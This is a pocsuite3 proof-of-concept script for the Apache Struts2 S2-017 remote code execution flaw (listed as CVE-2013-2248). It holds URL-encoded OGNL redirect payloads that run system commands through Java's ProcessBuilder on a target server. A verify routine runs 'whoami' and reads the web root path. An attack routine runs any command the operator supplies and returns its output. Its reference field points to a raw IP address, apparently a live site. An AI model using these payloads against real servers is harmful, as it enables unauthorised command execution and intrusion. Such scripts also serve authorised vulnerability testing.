# -*- coding:utf-8 -*- 
from collections import OrderedDict
from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, OptString, POC_CATEGORY
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from urllib.parse import urljoin
from pocsuite3.lib.utils import random_str


class DemoPOC(POCBase):
    vulID = "CVE-2013-2248"
    version ='1'
    author = ["LMX"]
    vulDate = "2017-07-07"
    createDate = "2022-2-3"
    updateDate = "2022-2-3"
    references =["http://5.249.156.94:8080/etrackweb/loginAction.action"]
    name ="S2-017 Remote Code Execution Vulnerablity"
    appPowerLink = ''
    appName = 'Struts2'
    appVersion = '2.0.0 - 2.3.15'
    vulType = 'RCE'
    desc = '''
    struts2-017远程代码执行漏洞
    '''

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description="攻击时自定义命令")
        return o    

    def _verify(self):
        result ={}
        payload = '''redirect%3a%24%7b%23resp%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2c%23resp.getWriter%28%29.print%28%27path88%27%2b%27888887%27%29%2c%23resp.getWriter%28%29.flush%28%29%2c%23resp.getWriter%28%29.close%28%29%7d'''
        payload_2 = '''redirect:%24%7B%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%27whoami%27%7D%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23dis%3Dnew+java.io.DataInputStream%28%23b%29%2C%23buf%3Dnew+byte%5B20000%5D%2C%23dis.read%28%23buf%29%2C%23msg%3Dnew+java.lang.String%28%23buf%29%2C%23dis.close%28%29%2C%23resp.getWriter%28%29.println%28%23msg.trim%28%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29%7D'''
        payload_3 = '''redirect:%24%7B%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23resp.getWriter%28%29.println%28%23req.getRealPath%28%22%2F%22%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29%7D'''
        headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Cookie':'SessionId=96F3F15432E0660E0654B1CE240C4C36'
                    }
        url = self.url
        r = requests.post(url=self.url,headers=headers,data=payload)
        rr = requests.post(url=self.url,headers=headers,data=payload_2)
        rrr = requests.post(url=self.url,headers=headers,data=payload_3)
        try:
            if 'path88888887' in r.text or 'root' in rr.text or 'tomcat' in rr.text  or '/webapps' in rrr.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except Exception as e:
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        
        result ={}

        cmd = self.get_option("command")
        payload = '''redirect:%24%7B%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%27RECOMMAND%27%7D%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23dis%3Dnew+java.io.DataInputStream%28%23b%29%2C%23buf%3Dnew+byte%5B20000%5D%2C%23dis.read%28%23buf%29%2C%23msg%3Dnew+java.lang.String%28%23buf%29%2C%23dis.close%28%29%2C%23resp.getWriter%28%29.println%28%23msg.trim%28%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29%7D'''
        headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Cookie':'SessionId=96F3F15432E0660E0654B1CE240C4C36'
                    }
        exp = payload.replace("RECOMMAND", cmd)

        try:
            response = requests.post(url=self.url, data=exp, headers=headers)
            if response and response.status_code == 200:
                result['Stdout'] = response.text
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)
        
register_poc(DemoPOC)
